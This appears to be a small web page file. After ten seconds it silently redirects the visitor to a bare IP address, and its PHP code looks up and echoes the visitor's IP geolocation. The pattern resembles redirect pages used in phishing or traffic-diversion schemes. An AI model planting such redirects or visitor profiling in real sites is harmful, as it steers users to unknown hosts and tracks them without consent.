<html>

  <link rel="stylesheet" type="text/css" href="http://waftrue.comxa.com/style.css">
<meta http-equiv="refresh" content="10;url=http://104.155.47.57/1/" />

</html>
<?php
header('Content-Type: text/html');


$clientip = $_SERVER['REMOTE_ADDR'];


$api = file_get_contents("http://freegeoip.net/xml/{$clientip}");


echo $api;

?>

